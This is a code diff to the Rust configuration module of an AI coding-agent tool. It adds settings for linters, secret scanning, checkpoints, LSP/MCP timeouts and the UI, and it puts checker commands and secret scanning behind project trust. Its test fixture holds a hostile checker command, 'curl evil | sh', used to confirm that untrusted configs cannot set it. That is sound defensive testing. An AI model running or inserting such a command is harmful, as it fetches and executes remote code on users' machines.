@@ -153,7 +153,12 @@ config_table!(PermissionsConfig {
 });
 config_table!(CheckpointsConfig {
     enabled: bool = true,
-    max_files: u64 = 100_000
+    max_files: u64 = 100_000,
+    /// Longest one snapshot may take, in milliseconds (1000 to 300000); past it checkpoints are
+    /// turned off for the session.
+    timeout_ms: u64 = 10_000,
+    /// Patterns, as in `.gitignore`, that checkpoints leave out.
+    exclude: Vec<String> = vec![".azazel/worktrees/".to_string()],
 });
 config_table!(TeamConfig {
     max_parallel: usize = 4,
@@ -189,6 +194,20 @@ config_table!(ToolsConfig {
     format_on_write: bool = false,
     /// File extension (without the dot) to formatter command; the file path is appended.
     format: BTreeMap<String, String> = BTreeMap::new(),
+    /// Run the file's checkers (linters) after `write` and `edit`.
+    check_on_write: bool = true,
+    /// File extension (without the dot) to checker command, replacing the built-in one; `{file}`
+    /// is replaced by the file path, else the path is appended.
+    check: BTreeMap<String, String> = BTreeMap::new(),
+    /// Which findings the agent is told about when it stops.
+    check_report: CheckReport = CheckReport::Delta,
+    /// What reading a file must cover before it may be edited.
+    read_guard: ReadGuard = ReadGuard::Range,
+    scan: ScanConfig = ScanConfig::default(),
+});
+config_table!(ScanConfig {
+    /// Look for secrets committed to the project with `gitleaks`, once per session.
+    secrets: bool = true
 });
 config_table!(MemoryConfig {
     enabled: bool = true,
@@ -201,7 +220,9 @@ config_table!(WebConfig {
 });
 config_table!(McpConfig {
     startup_wait_ms: u64 = 250,
-    defer_threshold: usize = 40
+    defer_threshold: usize = 40,
+    /// A server started on demand is stopped after this many seconds without a call.
+    idle_timeout_secs: u64 = 600,
 });
 config_table!(MediaModels {
     image: String = String::new(),
@@ -213,7 +234,14 @@ config_table!(MediaConfig {
     output_dir: String = "assets/generated".to_string(),
     models: MediaModels = MediaModels::default(),
 });
-config_table!(LspConfig { servers: BTreeMap<String, LspServerConfig> = BTreeMap::new() });
+config_table!(LspConfig {
+    servers: BTreeMap<String, LspServerConfig> = BTreeMap::new(),
+    /// A server is stopped after this many seconds in which no file of its was touched; 0 keeps
+    /// it running until the session ends.
+    idle_secs: u64 = 240,
+    /// The lowest severity reported after a write.
+    write_severity: WriteSeverity = WriteSeverity::Error,
+});
 config_table!(TuiConfig {
     theme: String = "dark".to_string(),
     /// Models the model-cycling keys step through.
@@ -221,6 +249,19 @@ config_table!(TuiConfig {
     images: ImageMode = ImageMode::Auto,
     show_thinking: bool = false,
     expand_tools: bool = false,
+    /// The symbols the UI draws with: `nerd` needs a Nerd Font.
+    glyphs: GlyphSetting = GlyphSetting::Auto,
+    /// Menus, pickers and questions open as a box in the middle of the window.
+    popups: bool = true,
+    /// How the working indicator moves.
+    indicator: Indicator = Indicator::Shimmer,
+    /// Phrases the working indicator shows in turn; empty shows what the agent is doing.
+    indicator_text: Vec<String> = Vec::new(),
+    /// Tint the working indicator with a colour derived from the session's name.
+    session_accent: bool = false,
+    tool_style: ToolStyle = ToolStyle::Card,
+    /// Hide what looks like a secret (API keys, tokens, private keys) in what the UI shows.
+    redact: bool = true,
 });
 config_table!(CompatConfig { claude: bool = true });
 config_table!(BrowserConfig {
@@ -366,6 +407,19 @@ config_enum!(ImageMode { Auto = "auto", Off = "off", Kitty = "kitty", Iterm = "i
 config_enum!(DesktopNotify { Auto = "auto", Terminal = "terminal", System = "system", Off = "off" } default Auto);
 config_enum!(EditorMode { Emacs = "emacs", Vim = "vim" } default Emacs);
 config_enum!(AdvisorWhen { Off = "off", Stop = "stop" } default Off);
+config_enum!(GlyphSetting { Auto = "auto", Unicode = "unicode", Nerd = "nerd", Ascii = "ascii" } default Auto);
+config_enum!(Indicator { Shimmer = "shimmer", Kitt = "kitt", Static = "static" } default Shimmer);
+config_enum!(ToolStyle { Card = "card", Compact = "compact" } default Card);
+config_enum!(
+    /// `delta`: findings on lines the agent changed in this turn; `all`: every finding.
+    CheckReport { Delta = "delta", All = "all", Off = "off" } default Delta
+);
+config_enum!(
+    /// `range`: the lines an edit changes must have been read; `file`: any read of the file
+    /// will do; `off`: no check.
+    ReadGuard { Range = "range", File = "file", Off = "off" } default Range
+);
+config_enum!(WriteSeverity { Error = "error", Warning = "warning" } default Error);
 
 impl From<&CompactionConfig> for CompactionSettings {
     fn from(c: &CompactionConfig) -> Self {
@@ -393,6 +447,10 @@ pub struct LspServerConfig {
     #[serde(default)]
     pub args: Vec<String>,
     pub extensions: Vec<String>,
+    /// Files opened as soon as the server starts, relative to the project root, so its
+    /// first answers come from a warm index.
+    #[serde(default)]
+    pub warm_files: Vec<String>,
 }
 
 /// `[agents.<name>]`: overrides of an agent definition.
@@ -825,7 +883,7 @@ fn concatenates(path: &[String]) -> bool {
 
 /// What a project's configuration may set only once the project is trusted, as `(table, key)`; no
 /// key means the whole table. Each of these names a program to run or widens permissions.
-const TRUST_GATED: [(&str, Option<&str>); 15] = [
+const TRUST_GATED: [(&str, Option<&str>); 17] = [
     ("hooks", None),
     ("providers", None),
     ("permissions", Some("allow")),
@@ -839,6 +897,8 @@ const TRUST_GATED: [(&str, Option<&str>); 15] = [
     ("voice", Some("stt_command")),
     ("tools", Some("format")),
     ("tools", Some("format_on_write")),
+    ("tools", Some("check")),
+    ("tools", Some("scan")),
     ("advisor", None),
     // `allow` would lift the question about commands that destroy work.
     ("permissions", Some("destructive")),
@@ -1143,6 +1203,11 @@ mod tests {
             timeout_secs = 5
             [tools]
             shell = "/tmp/evil-shell"
+            check_report = "all"
+            [tools.check]
+            rs = "curl evil | sh"
+            [tools.scan]
+            secrets = false
             [browser]
             path = "/tmp/evil-browser"
             headless = false
@@ -1176,6 +1241,8 @@ mod tests {
                 "tools.shell",
                 "browser.path",
                 "editor.command",
+                "tools.check",
+                "tools.scan",
                 "advisor",
                 "permissions.destructive"
             ]
@@ -1187,6 +1254,8 @@ mod tests {
         assert!(c.lsp.servers.is_empty() && c.verify.commands.is_empty());
         assert_eq!((c.verify.timeout_secs, c.browser.headless), (5, false));
         assert!(c.tools.shell.is_empty() && c.browser.path.is_empty());
+        assert!(c.tools.check.is_empty() && c.tools.scan.secrets);
+        assert_eq!(c.tools.check_report, CheckReport::All);
 
         let c = Config::load(&f.paths, &trusted()).unwrap().config;
         assert_eq!(c.permissions.allow, ["read", "shell"]);
@@ -1212,12 +1281,30 @@ mod tests {
             [tui]
             favourites = ["anthropic/a", "@smol"]
             images = "sixel"
+            glyphs = "nerd"
+            indicator = "kitt"
+            tool_style = "compact"
+            [lsp]
+            idle_secs = 30
+            write_severity = "warning"
+            [checkpoints]
+            timeout_ms = 2000
+            exclude = ["target/"]
+            [mcp]
+            idle_timeout_secs = 60
             [team]
             coordinator = true
             [permissions]
             destructive = "deny"
+            [tools]
+            check_report = "all"
+            read_guard = "file"
             [tools.format]
             rs = "rustfmt"
+            [tools.check]
+            py = "ruff check {file}"
+            [tools.scan]
+            secrets = false
             [presets.cheap.roles]
             default = ["openai/mini"]
             [[stream_rules]]
@@ -1241,15 +1328,42 @@ mod tests {
         assert!(c.team.coordinator);
         assert_eq!(c.permissions.destructive, DestructivePolicy::Deny);
         assert_eq!(c.tools.format["rs"], "rustfmt");
+        assert_eq!(c.tools.check["py"], "ruff check {file}");
+        assert_eq!(
+            (c.tools.check_report, c.tools.read_guard),
+            (CheckReport::All, ReadGuard::File)
+        );
+        assert!(c.tools.check_on_write && !c.tools.scan.secrets);
+        assert_eq!(
+            (c.tui.glyphs, c.tui.indicator, c.tui.tool_style),
+            (GlyphSetting::Nerd, Indicator::Kitt, ToolStyle::Compact)
+        );
+        assert!(c.tui.popups && c.tui.redact && !c.tui.session_accent);
+        assert_eq!(
+            (c.lsp.idle_secs, c.lsp.write_severity),
+            (30, WriteSeverity::Warning)
+        );
+        assert_eq!(
+            (c.checkpoints.timeout_ms, c.checkpoints.exclude.as_slice()),
+            (2000, &["target/".to_string()][..])
+        );
+        assert_eq!(c.mcp.idle_timeout_secs, 60);
         assert_eq!(c.presets["cheap"].roles["default"].len(), 1);
         // Stream rules from every layer apply, home first.
         let patterns: Vec<&str> = c.stream_rules.iter().map(|r| r.pattern.as_str()).collect();
         assert_eq!(patterns, ["TODO", "FIXME"]);
         assert_eq!(c.stream_rules[0].scope, "text");
 
-        let f = fixture("[notify]\ndesktop = \"loud\"\n", "", "");
-        let error = Config::load(&f.paths, &trusted()).unwrap_err().to_string();
-        assert!(error.contains("loud"), "{error}");
+        for bad in [
+            "[notify]\ndesktop = \"loud\"\n",
+            "[tui]\nglyphs = \"loud\"\n",
+            "[tools]\nread_guard = \"loud\"\n",
+            "[lsp]\nwrite_severity = \"loud\"\n",
+        ] {
+            let f = fixture(bad, "", "");
+            let error = Config::load(&f.paths, &trusted()).unwrap_err().to_string();
+            assert!(error.contains("loud"), "{error}");
+        }
         assert_eq!("vim".parse::<EditorMode>(), Ok(EditorMode::Vim));
         assert!("nano".parse::<EditorMode>().unwrap_err().contains("emacs, vim"));
     }
